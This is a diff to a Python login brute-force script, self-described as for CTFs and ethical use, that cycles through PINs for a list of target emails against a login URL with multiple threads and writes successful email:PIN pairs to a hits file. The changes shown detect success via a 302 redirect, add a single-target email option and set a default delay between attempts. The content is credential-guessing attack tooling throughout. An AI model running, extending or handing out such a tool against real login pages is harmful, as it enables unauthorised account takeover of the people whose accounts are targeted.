@@ -22,7 +22,8 @@ def attack(url, email, pin, delay, verbose):
             if verbose and attempts % 100 == 0:
                 print(f"[~] Attempts: {attempts} | Current: {email}:{pin}")
 
-        if "Welcome" in response.text or "Logout" in response.text or email.split('@')[0] in response.text:
+        # On redirect, response.status_code == 302
+        if "success" in response.headers.get("Location", "") or response.status_code == 302:
             print(f"[+] SUCCESS: {email}:{pin}")
             with open("hits.txt", "a") as f:
                 f.write(f"{email}:{pin}\n")
@@ -41,15 +42,17 @@ def main():
     parser = argparse.ArgumentParser(description="Brute force login utility (for CTFs / ethical use)")
     parser.add_argument("--min-digits", type=int, default=4, help="Minimum length of PIN")
     parser.add_argument("--max-digits", type=int, default=6, help="Maximum length of PIN")
+    parser.add_argument("--email", type=str, help="Target email")
     parser.add_argument("--email-file", type=str, default="emails.txt", help="File containing list of target emails")
     parser.add_argument("--url", type=str, default="http://192.168.1.218:5000/login", help="Target login URL")
     parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads")
-    parser.add_argument("--delay", type=float, default=0.0, help="Delay (in seconds) between attempts")
+    parser.add_argument("--delay", type=float, default=0.5, help="Delay (in seconds) between attempts")
     parser.add_argument("--charset", type=str, default="0123456789", help="Character set to use for PIN generation")
     parser.add_argument("--verbose", action="store_true", help="Enable status updates during brute force")
     
     args = parser.parse_args()
-    
+
+
     print(f"[*] Target URL: {args.url}")
     print(f"[*] Using email file: {args.email_file}")
     print(f"[*] Digits: {args.min_digits} to {args.max_digits}")
@@ -58,8 +61,13 @@ def main():
     print(f"[*] Delay: {args.delay} seconds")
     print(f"[*] Verbose: {args.verbose}")
 
-    with open(args.email_file, 'r') as f:
-        emails = [line.strip() for line in f if line.strip()]
+    if args.email:
+        emails = [args.email]
+    elif args.email_file:
+        with open(args.email_file, 'r') as f:
+            emails = [line.strip() for line in f if line.strip()]
+    else:
+        raise ValueError("Either --email or --email-file must be specified")
 
     with ThreadPoolExecutor(max_workers=args.threads) as executor:
         futures = []
@@ -73,4 +81,4 @@ def main():
 if __name__ == '__main__':
     main()
 
-    print(f"[*] Total attempts: {attempts}")
+    print(f"[*] Total attempts: {attempts}") 
